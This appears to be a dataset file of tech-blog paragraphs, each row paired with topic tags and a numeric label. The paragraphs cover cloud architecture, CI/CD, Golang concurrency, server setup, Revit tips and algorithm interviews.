1350,"Uber, at first glance, also eliminates queues (though one might argue that if no driver is available, youre most definitely in a queue, and a chaotic luck-of-the-draw queue at that). These are another key target of Edwardss frustration (though by his own admission, his article somewhat interchangeably talks of ticket and queues). Hes right about the issues that come with them. Queues, he points out Customer service management industries (including IT service management) have long implemented tiered support structures and work-handover practices built around the transfer of tickets from one assignment bucket to another. The queue, again, is a metaphor for a physical entity: the recipients on-desk in-tray. Just as a paper form gets passed to a single team or individual, so does the electronic workflow ticket.","['UX', 'Tickets', 'Itsm', 'DevOps']",1
1351,"But trying to remove tickets and queues begs the question of what theyll be replaced with. Id argue that there is still a need to represent atomic units of work. A ticket creates a definitive record of work. It enables prioritisation, communicates the current state of the task to anyone who needs to know, and even enables higher value behaviours such as exploration of supporting resources like knowledge articles. Even once the work is complete, and a live ticket goes dead, the body of recorded tickets provides great value, in the form of data analytics (a practice that is particularly advanced in the retail sector, where your purchases, however smoothly enabled through modern payment systems, each generate a detailed ticket of data). Perhaps there is scope for more sophistication in the structure of the records themselves: a shift from a predefined database row into something more fluid, but this doesnt feel like the priority. Tickets and queues will still happen.","['UX', 'Tickets', 'Itsm', 'DevOps']",10
1352,"This really depends on your personal taste. I tried both and prefer the first method. If I am collaborating with someone else on this project, and a new IAM needed to be created, the other person will have to be given permission to edit on Travis, if you start having larger teams, this becomes a hassle. There might be a team management tool in Travis, but it means I have to do the overhead. So its easier to stick the encoded variables right in Travis. You can find more details about Travis encryption here.","['AWS', 'Scala', 'Lambda', 'Travis Ci', 'Serverless']",15
1353,"Let's see if all this time spent was actually worth it! You will see the Travis come to life. It will spit out a lot of things. It will run sbt assemly and create the target jar file, packaging everything. Then the serverless framework will take that jar, head over to AWS and deploy a cloud formation template to create all the resources needed. The jar file is uploaded into an S3 bucket, also auto-generated. It will create a lambda function and attach the API gateway.","['AWS', 'Scala', 'Lambda', 'Travis Ci', 'Serverless']",7
1354,"Datastore is very much at the centre of the tool. Every object we managebrands, training images, label maps, datasets, modelsis represented by an entity, organised in six kinds: Brands and Logos: First, we need a notion for the objects we want to detect. In our case, these are brands or, to be more precise, logos. Oftentimes, a brand has more than one logo, e.g. a word mark and a figurative mark or even multiple logos. Therefore, we distinguish between logos (the things we actually train our models to detect) and brands (what our analytics are based on) and introduce a one-to-many parent-child relation in Datastore.","['Google Cloud Platform', 'Serverless', 'Logo Detection', 'Machine Learning', 'Cloud Datastore']",8
1355,"Model Checkpoints: One advantage of using the Tensor Flow Object Detection API is that you dont have to build and train your object detection model from scratch. Instead, you start with a pre-trained model and fine-tune its weights with your data which saves training time. If later, you want to improve your model further e.g. because you have new data, you can now start from your last model run. Hence in our case, every model has an ancestor. We mirror this model hierarchy in Datastore using a one-to-many parent-child relation. Therefore, every Model Checkpoints entity has a parent property along with a property for the dataset ID that was used for this particular model training run. The Tensor Flow model checkpoint files themselves are stored in Cloud Storage, of course.","['Google Cloud Platform', 'Serverless', 'Logo Detection', 'Machine Learning', 'Cloud Datastore']",8
1356,"Annotating images is still a heavily manual task of course, but at least it is now integrated into one single tool and process. Unlike before, it uses tool-wide consistent IDs for the logo classes. : Which images have no annotations yet? How many examples with the Adidas logo do we have? As a nice side effect, we can easily add examples of the logos to our brand/logo management section by just querying the bounding box information from Datastore and cropping the images accordingly: So far, so good, but I reckon that a serverless solution somehow lacks coolness without Cloud Functions. Luckily, we could mitigate this flaw: To ensure every image conforms to the requirements of the Tensor Flow models (in particular, they need to have three colour channels), we extended the upload process with a Cloud Function that automatically converts every image to RGB if necessary. At the same time, it also extracts metadata like the dimensions.","['Google Cloud Platform', 'Serverless', 'Logo Detection', 'Machine Learning', 'Cloud Datastore']",19
1357,"After deploying this, we thought it might be fun to use Googles Vision API to add a bit of context to every image (usually sports scenes). Therefore, we wrote another Cloud Function that sends every image through the Vision API and adds the detected labels (e.g. ice hockey or skiing or galliformeser, what?) Were not sure yet how useful this feature really is, but since almost everything on GCP is just an API request away and writing a Cloud Function is super easy and fun, why bother. Lets just try it out and see whether it proves to be useful or not. And so, images are now searchable for brands and context. Summarising, heres how the whole image upload and processing pipeline looks like: Once the annotated images are ready together with the label maps that define sets of logos to train a model with, we can pack the training data into a TFRecords file. First, we query the information we need from Datastore: We start with the ID of the label map of interest, query its constituents (logo IDs) and then the images containing these logos together with the bounding box information. Second, we pull the required image files from Cloud Storage, pack everything into one TFRecords file, and ship it back to Cloud Storage. All with a single click on a button on the frontend and with the backend running recycled Python code from before when we still did all of this on our local machines.","['Google Cloud Platform', 'Serverless', 'Logo Detection', 'Machine Learning', 'Cloud Datastore']",6
1358,"Every tree starts with a pre-trained architecture from the Object Detection API model zoo at its root. Uploading such a model creates a representation of the model in the form of a Datastore entity as well as a directory on Cloud Storage with the checkpoint files. From here, one can create a child model by forking it. Every fork creates another model entity and a copy of the checkpoint files in its own directory. To train it, click on the respective button, chose a dataset, set the training parameters, give it a description, and the training can start. The backend will write the necessary Object Detection API config files to Cloud Storage and then launch a training job on Cloud ML Engine (CMLE). Depending on the commissioned machinery, model architecture, and innovations introduced by the dataset, the job may run for a couple of hours. Therefore, the status of the job is queried periodically via the CMLE API to check whether it is still running or has completed.","['Google Cloud Platform', 'Serverless', 'Logo Detection', 'Machine Learning', 'Cloud Datastore']",15
1359,"Say you have a video featuring the Rivella logo which our model has never seen before (probably like you, unless you are Swiss). The localisation model would still recognise it as a logo because it has the abstract features of a logo. It just doesnt know what logo, so it saves its feature representation and flags it as unclassified logo. The admin can then go through all video frames with unclassified logos and assign the right logo to the proposed bounding box. Not only for this frame but for also all past and future ones since different examples of the same logo should produce a very similar feature representation. See how this integrates nicely into the admin tool with its application-wide logo management and annotation feature? Second, we see it as some sort of blueprint for future projects and products. This is by no means restricted to brands and logos or this kind of object detection models. With a few tweaks, it will be applicable in another context. Hence, we see it as a general tool for other use cases and well worth the exercise.","['Google Cloud Platform', 'Serverless', 'Logo Detection', 'Machine Learning', 'Cloud Datastore']",19
1360,"As some of our other applications were already running on Amazon Web Services, this was an easy decision to make. Especially as all requirements were covered with the Elastic Kubernetes Service (EKS), Aurora My SQL, Cloud Front and Web Application Firewall (WAF) / AWS Shield, which resulted in the following simplified architecture: Visitors would access the site via the DNS entry for your-now.com, which points to a Cloud Front distribution. The Cloud Front origin has a WAF and Lambda@Edge function associated, to restrict access to the site before go-live. The origin of the Cloud Front Distribution consists of an Application Loadbalancer (ALB), which targets the Autoscaling Groups (ASGs) of the EKS worker nodes. These can contain a mixture of on-demand and spot-instances, to keep a stable baseline with flexible scaling, while keeping the costs at a minimum. Cluster Autoscaler then dynamically adjusts the desired instances inside these ASGs based on the resource demands inside the clusters. The application itself is deployed as a a Deployment artefact, with a flexible number of replicas.","['AWS', 'Kubernetes', 'Cloud Computing', 'Terraform', 'Infrastructure']",11
1361,"For performance and availability monitoring of the remaining components we use Data Dog. Their AWS Integration is perfect for serverless monitoring of key infrastructure components. As Data Dog can get access to our monitoring data via AWS Identity Access Management (IAM) directly, there is no need to deploy and manage any components ourselves. This is a good way for monitoring the Aurora instances and to get basic performance metrics of our Cloud Front distribution. However, monitoring the Kubernetes cluster with their Kubernetes Integration, is only possible by deploying a monitoring agent to EKS. Using the official helm chart, this process is straightforward. Additionally, we can make use of the autodiscovery feature, to dynamically add checks to our cluster. This can be used to check the connectivity to the application via the Cloud Front distribution, the ALB or the Node Port service directly, to easily identify faulty components in the chain.","['AWS', 'Kubernetes', 'Cloud Computing', 'Terraform', 'Infrastructure']",11
1362,"Especially during the first couple of months following the initial release, keeping your boat afloat is what youll spend most of your time doing. Usually, development is carried by a handful of developers over an extended period of time. No one sees the bigger design and implementation picture anymore. Even if you have the most skilled engineers and the most extensive test suite, there are going to be holes in your boat. What matters is: how fast can you fix them? As a rule of thumb, the more experience you have with a specific piece of technology, the faster youll be able to plug those holes. When adding the cutting edge in technology to your stack, you inherently lack this experience. This means youll be spending an awful lot of time on every issue you encounter. On top of that, information is often scarce, and your options for sourcing expertise externally are limited.","['Programming', 'Startup', 'Software Development']",12
1363,"Developers who are proficient in their technology make better design decisions than developers who arent. Needless to say, theyre far more likely to be proficient in a boring stack than in a cutting edge one. This leads to fewer holes in our boat, which is still a good thing! Of course you should, but it should be a careful consideration. The takeaway from this article is that you should start a project on a reasonably stable, perhaps a little old-fashioned stack. Once you are familiar with what your customers are looking for in your product, youll be able to far better match technological decisions with their requirements. At that point, youll be innovating for the right reasons, instead of just for the sake of being innovative.","['Programming', 'Startup', 'Software Development']",12
1364,"In the past, these services would live inside one monolithic architecture or one bakery. With the introduction of inventive microservices architecture, serving cookies to customers can be thought of differently. Microservices architecture breaks down the traditional structure allowing the cashier and storefront to operate independently of the server between the oven and the display. The server is now also independent of all of the ovens set up to bake cookies. The ovens, likewise, are separate from all the bakers that are mixing ingredients. Each service is now independent of one another. In doing so, microservices architecture provides a few key benefits: Parallel development and deployment Improved scalability Improved testability Lets go through each benefit outlined above, using our new example.","['Serverless', 'Microservices', 'AWS', 'AWS Lambda', 'Architecture']",10
1365,"Sunny day12:44 12:47: Our monitoring apps report that the app is down. Gear up and find whats going on. The website is loading slow and after the timeout, it throws 504Gateway Timeout Error. This occurs when the server you requested data tried to connect to another server, usually under a private network, and the response took too much so it decided to timeout it.13:04: After many tries to test each worker node connectivity with other instances, found out that My SQL queries are timeout-ing. SSH is also throwing a timeoutone of the reasons can be hardware issues. Proceeding soft rebooting the droplet via CLI. Reporting the incident to Digital Ocean.13:08: The app goes into maintenance mode, at least to turn into a proper response for users. (We got maintenance mode pages)13:10: The soft reboot on droplet stops with an error. Proceeding hard power-cycle (i dont recommend doing this: it can corrupt data; since the droplet didnt give or receive data for 15 mins and we guessed there were hardware issues, putting it to sleep by using a pillow on its face is considered somehow safe)At this specific point, Id spin up a new droplet with My SQL, import the backup (which is 11 hours behind this point) and fix the connection data within each worker node.14:19: After attempts, spinning up a new instance and downloading and importing the backups considered to be too late: the app was down for almost 2 hours, but the hardware issues were fixed in the meanwhile. Monitors reports that the app is healthy.",[''],11
1366,"It is configured automatically, both single and multi-node. If one instance goes down, the service doesnt go down. The whole traffic inbound is going only to healthy instances of your database. Once the things go up again, the healthy databases will help the ex-unhealthy ones catch up (sync) when they getupagain.",[''],11
1367,"The point I wanted to make at the meetup was that agile techniques arent just for projects. Consciously or not, we often apply them outside of our working lives. Ive heard of colleagues planning their weddings and holidays using Trello and Im not sure if thats a new level of nerd or genius. But then, as Ive argued before, a lot of agile is just common sense; think back to my baking analogy. You didnt stop baking just because your first cake tasted of salt, right? Over the last few weeks, Ive pivoted (as a good agile practitioner does) and have focused on rehab and improving a lift that had started to lag a little. Its given me a chance to re-plan and refocus on the British Championships in May, and work out what my goal for that is. In a couple of weeks Ill be ready to start preparing for that, and Ill be starting from a strong position because of the foundations Ive built. And if that isnt agile, I dont know what is.","['Agile', 'Powerlifting', 'Strength', 'Improvement']",1
1368,"When it asks for a password just hit enter to create a password less certificate. This command works on both Mac and Linux. Windows however has slightly different commands, but there is a way to get Ubuntu Bash terminal in Windows 10 natively. If you dont have this yet I do recommend you to try it out. You can follow this tutorial on how to enable it: __url__ this.","['Nginx', 'Centos7', 'Ghost Blog', 'Http2', 'Https']",7
1369,"Next we will make sure root logins are not allowed anymore. And if you want you can also disable password logins to your server. This means the only way to login is to user your certificate. If you loose it or if you try to access your server from another computer you are screwed. Digital Ocean does have a backup plan though, you can login to their control panel and get root ssh access that way if you get locked out. I locked myself out making this tutorial by taking some of the steps in the wrong order, but gained access again through the online terminal.","['Nginx', 'Centos7', 'Ghost Blog', 'Http2', 'Https']",7
1370,"We wont start NGINX just yet, so the status should be inactive. Then we will edit the nginx config file. What we want to do is change min max allowed file upload size to 50mb, the default is 2mb, so you can upload photos or files larger than 2mb to your blog. Then we will add some settings for https with which protocols and ciphers to use. And the last three lines are for activating some cache so your blog can be served faster. Look out for any duplicate lines.","['Nginx', 'Centos7', 'Ghost Blog', 'Http2', 'Https']",11
1371,"JSON Web Tokens are an open standard based on JSON to generate access tokens. JWTs contain a JSON payload, a header and a signature. Based on the public signature you can read the content of the JSON payload. But when trying to alter data, the JWT will no longer contain valid data. And when trying to validate the JWT on the server will fail. Every microservices knows the permissions required to perform a given action. So they can read the data from the passed JWT without having to validate against any other web service.","['Microservices', 'Software Architecture', 'API', 'Software Development', 'Backend Development']",11
1372,"A good thing about airframe-http is that no DSL is required other than the Endpoint annotations. The above example is just a regular Scala trait that is independent from any web framework, so we can write test code for the implementation without running web servers. When we use this trait with airframe-http, it will translate HTTP requests to corresponding function calls in Scala, and returns its result as JSON HTTP responses.airframe-http-finagle is an extension of airframe-http to use Finagle as the web-server backend. airframe-http-finagle is available since Airframe version 0.66: To start an HTTP server backed by Finagle, you need to define Router and Airframe design as follows: When building a Finagle Server instance, a server thread for receiving HTTP requests will start at the specified port. If Airframe session terminates, the HTTP server will automatically terminate. This is using the life cycle management feature of Airframe. To add more REST endpoints, you can use Router.add[X] method.","['Web Development', 'Airframe', 'Scala', 'Finagle']",11
1373,"If we read Scala signatures, we can find its original type Seq[User]. We can also read method argument names and types as well.airframe-surface is a library for reading Scala signatures by using Scala reflection (For Scala.js, it uses Scala Macros to extract type information at compile-time). airframe-surface enables reading detailed type information from classes and methods. This information makes easier to define mappings between HTTP requests to Scala functions.airframe-http uses airframe-surface to check the method signatures of a given web API class. After finding methods that have Endpoint annotations, we read method arguments to define HTTP request routing table.","['Web Development', 'Airframe', 'Scala', 'Finagle']",15
1374,"At Koinex, we are dedicated to provide the best trading experience to our users. Considering the volatility of cryptocurrencies, delivering updated Ticker, Order Books, Open Orders, Settlement Details etc. becomes crucial to ensure seamless trading for users in a high-paced market where milliseconds matter. Depending upon the upward or downward movements of markets traders book positions by taking create, modify or delete actions on their orders. So if there is a lag in providing the realtime market data points, the user might miss an opportunity to make some profit or worse, end up in a loss. So, we have to ensure that we deliver the utmost updated data with the minimum possible latency.","['Blockchain', 'Cryptocurrency', 'Golang', 'Engineering', 'Programming']",6
1375,"There are basically two types of messaging patterns used in microservice ecosystems. First is Push model, in which one service synchronously calls another service and waits for the response. Another is, Pull model in which each service is connected to a central bus (message queue in general) and inter-service communication is avoided to an extent. Pull model scales more when compared to Push. A Pub Sub system serves as the backbone of Pull based systems, Apache Kafka is one such example. A Pub Sub system exposes two interfaces:i) Publish(Pub): Publish lets producers publish messages on a particular channel. Channels (also topics) is the segmentation layer through which subscribers can listen to only the messages they are interested in.ii) Subscribe(Sub): Subscribe lets subscribers listen to messages according to their interests. They do this by only subscribing to channels they are interested in.","['Blockchain', 'Cryptocurrency', 'Golang', 'Engineering', 'Programming']",10
1376,"Most of the Pub Sub systems maintain a queue which is used for message buffering and persistence in case there are no active subscribers. The subscribers execute different workloads depending upon different messages they receive on channels over the course of time. Pushman is not designed for such type of messages, its only optimized for delivering the realtime value of an attribute with minimum latency to a large pool of online subscribers. take the price of Bitcoin, there is no point in returning 5 mins old price to a subscriber that dropped off the website. Pushman is developed keeping the Single Responsibility Principle (SRP) in mind.","['Blockchain', 'Cryptocurrency', 'Golang', 'Engineering', 'Programming']",11
1377,"To achieve high throughput we decided to write our code in a concurrent way that can be parallelised using multiple CPU cores. If you are not familiar with Concurrency and Parallelism, you can listen to this insightful talk by Rob Pike, co-designer and developer of the Go programming language At a given time, the number of online users will be contributing to the size of the connection pool of pushman-sub server, which will be large at any point of time. Given a single connection from this connection pool, Pushman has to:a) Listen for commands over the connection (subscribe, unsubscribe etc. )b) Check on the heartbeat of the connectionc) Send messages over the connection Each connection will require 2 threads in total, one for reading and one for writing on the connection. Comparison of the initial thread stack sizes for different programming languages: Python and Node were not feasible options as they dont support parallelism over multiple CPU cores out of the box. Suppose, we have to support 1M online users and we go with Java/C++, we end up using 20008000 GB memory if each connection uses 2 threads without counting for extra data structures allocations in the thread. So, Golang comes out to be the real winner here. With the help of goroutines, Golang can create 1M concurrent execution units with just 48 GB of memory. And to no surprise we are running, 1.5M goroutines on an AWS m4.2xlarge production instance. Writing concurrent code in Golang is real fun due to its simple design and it made sense to save development time also. And yes, Golang automatically runs goroutines over all available CPU cores unlike Python and Node.js.","['Blockchain', 'Cryptocurrency', 'Golang', 'Engineering', 'Programming']",11
1378,"Lets assume we have 1M open websocket connections and for each such connection we have a reader goroutine with ws Sub.receive()called. The consumed RAM is 24 GB provided we dont have any further allocations done. The real question here is, would you always be receiving commands from the subscribers? Not really, most of the time you will be sending messages to a subscriber once it has subscribed to a channel. On a server with N cores, only N goroutines can execute in parallel at once. Our 1M goroutines are waiting for a packet to arrive on the connection, so that they can be invoked and executed. The goroutine invocation is handled by Golang internally, but given such large number of connections to monitor its not optimal to delegate the responsibility to the Golang runtime. This is known as C1M problem, or Connections 1 Million problem.","['Blockchain', 'Cryptocurrency', 'Golang', 'Engineering', 'Programming']",11
1379,"EPOLL is a kernel notification mechanism through which we can ask the Linux kernel to monitor a large number of open file descriptors and get notified in constant time about the ones which are available to read. Once we get the readable file descriptors we can start our goroutines. This way, we can save the memory used up by idle reader goroutines and also speed up the code execution by calling receive() only on the subset of the complete file descriptor set. We made use of the excellent netpoll library to achieve this. Heres is a example demonstrating the use of netpoll,Pushman is required to be a highly concurrent system to fit within the design constraints. It was clear that we cannot use any disk persisted database for state management due to requirement of high number of allocations/deallocations per second. So, we decided to take a full in-memory approach and stored everything in RAM. It was also supported by the realtime nature of messages Pushman delivers. For eg., if the message containing the price of BITCOIN at 1.3th second gets lost due to a server crash, Pushman can always deliver the message containing BITCOIN price at 1.8th second. The user will always see the updated price. In-Memory systems come with their own problems, one has to be very diligent in their implementation to avoid segmentation faults. Considering the concurrent nature of Pushman, the possibility of incorrect memory access increases many folds. We will discuss later how we implemented some locking techniques to solve the memory access issues.","['Blockchain', 'Cryptocurrency', 'Golang', 'Engineering', 'Programming']",3
1380,"Data protection is the most important concern while dealing with in-memory systems. Golang has a beautiful API that allows you to define your mutexes along with your struct definition: Now, consider two concurrent operations running in parallel:a) We are traversing the ticker_INR channel BST to find all the subscribers to send a messageb) We are adding a new subscriber to ticker_INR channel While we are carrying operation b we need to have a write lock on the BST structure. The problem with map is that whenever you update the value at a key, you need to acquire a global write lock that prevents concurrent modification to another key in the map also. Pushman being a high throughput system, the write locks were getting hit very frequently and message delivery latency was increasing. We then decided to shard Pushmans internal data structures to decrease the lock contention. We developed safemap package to shard on the map key itself and sharded Map package to shard on an externally provided key. Here is the basic implementation of a safemap: Lets see a comparison between non-sharding vs sharding approaches when a new message arrives on ticker_INR channel and is required to be sent to all its subscribers.","['Blockchain', 'Cryptocurrency', 'Golang', 'Engineering', 'Programming']",11
1381,"Using the above mentioned points we increased our throughput to a good number and significantly reduced the latency. There are some other important optimisations that I would like to highlight here, without discussing in much detail about them.a) Resource Pooling: Pool system resources such as TCP connections and goroutines because initialisation requires extra overhead, consuming both CPU and memory and thus increasing the latency. Apart from resource pooling, use resource limiting options like limiting connection pool size and goroutines pool size to avoid starvation and process crash.b) Allocate wisely: Goroutines are cheap but if you aggressively allocate new structures inside a goroutine, the memory consumed will increase in proportion to the number of active goroutines, which will always be high in a concurrent system. So use strategies such as singleton instances and pass by pointers.c) Use I/O buffers: Disk and Network I/Os are costly, always try to use read/write buffers wherever possible. Read more on this here.d) Horizontal Scaling: An application deployed over a single server will always have limited CPU and memory to use. ~1M instructions can be executed per second on a standard CPU core. This implies that if you have a server instance of 8 cores, you can at max send 8M messages/sec. With horizontal scaling, you can deploy your application as a distributed application comprising of N server instances increasing your message throughput by N times. in the current deployment, Pushman has a message throughput of 32M with 4 production servers. A distributed system comes with its own perks of providing fault tolerance and availability by providing an option of using multi active zones deployment topology.","['Blockchain', 'Cryptocurrency', 'Golang', 'Engineering', 'Programming']",3
1382,"Building Pushman was fun, we learned a lot of optimisation techniques on the way. Recently, we integrated Pushman into Loop as well, checkout Loop if you havent yet. Loop is a peer-to-peer trading platform to transact in digital assets using fiat currency. By building Pushman we were able to reduce third party integrations from our platform and managed to cut our costs by 20x! Please share your experiences with similar problems in the comments and feel free to reach out to me at Twitter or write to me at ankush@koinex.in, in case you have any interesting problem to discuss.i) __url__ careers@koinex.in.","['Blockchain', 'Cryptocurrency', 'Golang', 'Engineering', 'Programming']",6
1383,"The lambda function boils down to the following flow, which we separated out into separate, individually unit-testable (!!!) Receive the Lambda@Edge event in our event handler. The event has lots of information and context about the asset being requested, but were mostly interested in a few fields inside the request field.2. From the request field, we can parse out 3 important pieces of information: the S3 bucket name, the path to the asset, and the semver range.3. With the bucket name and asset path in hand, we can make a request to the bucket to list out all the possible versions that have been deployed. We can do this because we standardized on uploading files to a folder named after the semver version. Getting the list of objects in a given directory on S3 will give us those versions. Any folder names that are not valid semver can be safely ignored and filtered out.4. Resolve the exact version we need from the range we want. This is actually super easy because the semver NPM library has a function called max Satisfying. This is extra cool because it takes any kind of range syntax, meaning our redirect url will support any valid range syntax that the semver package supports, even craziness such as >=1.2.7 <1.3.0 in our urls.5. Rewrite the uri field we received from Lambda@Edge to point to the exact asset (if all above steps succeeded).","['JavaScript', 'NPM', 'Serverless', 'S3', 'Lambda']",15
1384,"Now that the lambda logic is written (and fully unit tested!! ), we need to hook the lambda up to Cloudfront. In our Cloudfront distribution, we add a new Cloudfront Event association as a Behavior. In it, we say that whenever an Origin Request happens (meaning the asset being requested isnt cached by Cloudfront already so it has to request it from the origin), it should trigger running our Lambda function. Whenever a url is requested on this Cloudfront distribution, it will run our Lambda function (if it hasnt already cached the response already) and our function can either ignore it and let it pass unmodified to S3, or direct it to an exact asset! Weve been running this code in production for a few months now, and its been working great. Weve recommended to all of our applications to use static assets this way, and to default to pointing to __url__ redirect urls so that they automatically get bug fixes when theyre rolled out. Were excited by the possibilities that this unlocks, and are looking forward to leveraging it further in the future.","['JavaScript', 'NPM', 'Serverless', 'S3', 'Lambda']",11
1385,"This common build does a few things. The only parameter is a collection of services which are the things that need to be built. Each object it iterates through has 3 properties defined; the tag Name, version, and the dockerfile Name. The build will first authenticate with the Azure ACR so that all of the following docker commands will work. After login occurs, each service is built and pushed to the ACR. Finally, all of the Kubernetes tamplates are saved as artifacts to be used in my release later. The additional docker pull commands are for caching previously built images from the ACR. If you want more info on this, check out this article by Andrew Locke. We had previously used Docker Compose to manage building all of our images in the solution but it seemed silly to have that dependency just for that reason.","['Docker', 'Azure Pipelines', 'Vsts', 'Yaml', 'DevOps']",7
1386,"In the previous post, we covered three easy hacks you can incorporate into your working environment to start making Revit drawings look like the ones you have long printed from Auto CAD. Here Im going to explain three more advanced features that should be undertaken by the Revit expert in your office (or by an outside consultant if necessary). These tips will benefit all users but having them implemented by beginners could do more harm than good. We recommend whoever does them is well-versed in Revit families. But again, once they are set up, they will make life easier for everyone.1. Custom Annotation Families If a firm has been working in Auto CAD for several decades, their elevation markers, sections, dimension text and other annotations are probably different than out of the box Revit Annotation Families. Out of the box Annotation Families are a great base for starting to craft your new (old) office standards. For example to get started on your new Elevation Markers start by saving an out of the box family with a standardized name such as OFFICE_Elevation Marker to differentiate it and create a new file. In Revit, you can edit the Elevation Markers to match whatever styles and texts your firm has used in Auto CAD. One reason it is so crucial to have an expert on Revit Families take on the task is that a single Elevation Marker is actually made up of two nested Families. You will need to go into the nested Family and edit it, then reload it into the Family it was nested in. At the root of these Families however are simple Revit annotation tools such as Lines and Filled Regions.2. Customizing 3D Families in Plan Sometimes the issue with an out of the box 3D Family is the way it appears in plan. Doors are a great example of this. Door swings are not physical model elements, but rather Annotation Lines (in the Family editor they are called Symbolic Lines) built into the Family. Often firms like to add Annotation Lines to show the ADA required clearances of all doors. Even though Annotation Lines are 2D and not physical elements, in Families they are often still driven by parameters. Lets say your door is 36 and someone makes a new Type that is 42; if you have changed the swing lines without locking them to the parameters you will have a very awkward door swing in your project, or worse the Family will break. Theres a lot of information out there on Family creation for beginners, but this is tricky stuff that will affect all projects in the office going forward and is again something that someone confident in their Revit Family creation abilities should do.3. Graphic Overrides in View Templates In an another post I talked about View Templates and how they can be used for coordination. While there may be specific Families such as doors where it makes sense to edit Symbolic Lines, there are entire categories of Families, such as walls and floors, which you will not be able to edit in a F __url__ file. The best way to customize how these Families show up in Revit views is creating line thicknesses, weights and depth to correlate with what you used to show in Auto CAD. Of the three strategies in this post, this probably is the safest and most wide ranging one. Because you are just editing View Parameters and not Families, there is much less risk about serious damage to the model.","['Autodesk Revit', 'Autocad', 'Bim', 'Architecture', 'Revit']",19
1387,"Start by creating an empty Ionic application using the tabs template. Run ionic start to create the empty application, and run the application with ionic serve,This creates and runs the default tabs application. In Chrome Browser, open Menu > More Tools > Developer Tools > Application, and click the toggle device toolbar button to switch to a mobile application layout,Instead of Tab1, Tab2, and Tab3, I would like to create tabs for Feed, Chat and Profile. I could delete the default tabs and create new ones, of course. Eat your heart out if you want to. Instead, I choose to rename the default tabs.","['JavaScript', 'Ionic', 'Angular', 'Mobile App Development', 'Typescript']",19
1388,"Binary-based distributions provide all of the software components already pre-compiled and ready to be installed. These components are compiled with good-enough build options that work fine for the majority of users. They also do provide sources for these components for the minority of users that need or want to compile their own components. Following our supermarket analogy, this supermarket contains all of the food pre-packaged and pre-cooked, but with clear instructions on how to get the ingredients and repeat the process for those that want to tweak a recipe or two. This kind of distribution is exemplified by Debian, Fedora Core, Open SUSE, Ubuntu, and many others. And while they provide the same type of system, they all do so using differentand unfortunately, incompatiblemethods. Theyre the primary kind of distribution used in general purpose computers such as servers, desktops, and laptops.","['Docker', 'Linux', 'IoT', 'Yocto', 'Debian']",16
1389,"Source-based distributions, on the other hand, focus on providing a framework in which the end users can build all of the components themselves from source code. These distributions also provide tools for easily choosing a sensible starting collection of components and tweaking each components build as necessary. These tweaks can be as simple as adding a compile flag to using a different version of the sources or modifying the sources in some way. A user will assemble a menu of what they want to build and then start the build. After minutes or hours, depending on the case, they will have a resulting image which they can use for their computer. Examples of this kind of distribution are Gentoo, Android, and Yocto. In our supermarket analogy, this is closer to a bulk foods store, where you can get pre-measured foods with detailed machine-readable cooking instructions, and youd have a fancy cooker that can read those instructions and cook the meals for you. And handle tweaks to a range of recipes such as adjusting for brown rice over white rice. Sort ofthe analogy gets a bit weak on this one.","['Docker', 'Linux', 'IoT', 'Yocto', 'Debian']",16
1390,"Yocto is composed of a series of recipes, each of which describes how to build one module of the system (e.g. These recipes are then collected into layers which collect a series recipes and configure various aspects of how they are supposed to be used together, from compile flags to recipe features, to details on how they show up on the target. Each target build will be composed of a few of these layers, each one adding or removing packages from the lower layers, or modifying their default behavior. This allows multiple parties to tweak their own layer to affect final images. So if the base layer uses a conservative set of compiler flags (which it usually does), a chip vendor can add compiler flags that are beneficial to their specific chip model, and a board vendor can remove chip functionality that their board might not support.","['Docker', 'Linux', 'IoT', 'Yocto', 'Debian']",15
1391,"To clarify this principle, lets examine a real-world application. Lets say you just moved into a new apartment. One of the things on your to-do list is to unpack and store your extensive collection of spices. Which organizational approach below would you take? Would you: Sort your spices in alphabetical order or by spice type, as your labeled spice rack might encourage you to do. Every time you cook, you search through your entire cabinet for the spice you need.","['Web Development', 'Cache']",8
1392,A computers cache is simply a smaller memory store containing the most recently accessed information. Think of it as the drawer holding the top 10 most frequently used spices in our example above. Its faster to search through a drawer with ten items than it is to search through a cabinet containing hundreds of items. Caches work in the same way. Most recently used items are stored in fast access hardware such as RAM (Random-access memory). This limits the need to access the underlying larger (and slower) storage layer.,"['Web Development', 'Cache']",8
1393,"The interview process usually begins with an initial phone screen and then an all-day on-site that check for coding skills and cultural fit. Almost without exception, the deciding factor is coding aptitude. After all, engineers are paid to deliver working software at the end of the day. Traditionally, whiteboarding is used to test for this aptitude. More than getting the answer right is the thought process clearly articulated. In code as in life, the right answer is not always clear, but good reasoning is usually good enough. The ability to reason effectively signals the potential to learn, adapt, and evolve. The best engineers are always growing, and the best companies are always innovating.","['JavaScript', 'Algorithms', 'Big O Notation', 'Technical Interview', 'Front End Development']",0
1394,"To truly master Algorithms is to understand them in relationship to Data Structures. Data structures and algorithms go hand-in-hand like Yin and Yang, the glass and the water. Without the glass, water cannot be contained. Without data structures, we have no objects by which to apply logic. Without water, the glass is empty and devoid of sustenance. Without algorithms, objects cannot be transformed or consumed.","['JavaScript', 'Algorithms', 'Big O Notation', 'Technical Interview', 'Front End Development']",5
1395,"Once the problem domain is thoroughly grasped, brainstorming of the solution space can begin. How many loops and what kinds? Are there any clever built-in methods that can help? Complex or repeated logic can be difficult to read and understand. Can helper functions be extracted or abstracted? An algorithm usually needs to be scalable. As input sizes grow, how will the function perform? Should there be some kind of caching mechanisms? Generally, memory optimizations (space) will need to be sacrificed for performance gains (time).","['JavaScript', 'Algorithms', 'Big O Notation', 'Technical Interview', 'Front End Development']",3
1396,"When a high-level structure of the solution begins to appear, the pseudocode can begin. To really impress the interviewer, look ahead for opportunities to refactor and reuse code. Sometimes, similar-behaving functions can be combined into a more general function that accepts an extra parameter. Other times, de-parametrization through currying is better. Keeping functions pure to ease testing and maintenance also shows foresight. In other words, consider architectural and design patterns in the calculus of your decisions.","['JavaScript', 'Algorithms', 'Big O Notation', 'Technical Interview', 'Front End Development']",9
1397,"The most optimum algorithm scales in constant time and space. This means it does not care at all about the growth of its inputs. Next best is logarithmic time or space, then linear, linearithmic, quadratic, and exponential. The worst is factorial time or space. In Big-O notation: Constant: O(1)Logarithmic: O(log n)Linear: O(n)Linearithmic: O(n log n)Quadratic: O(n)Expontential: O(2^n)Factorial: O(n! )Big-O asymptotic analysis is an indispensable tool as we consider the tradeoff between time and space complexities of an algorithm. However, Big O ignores constant factors when in actual practice may matter. Moreover, optimizing for time and space may increase implementation time or negatively impact code readability. When designing the structure and logic of an algorithm, the intuitive feel for what is truly negligible is as important.","['JavaScript', 'Algorithms', 'Big O Notation', 'Technical Interview', 'Front End Development']",3
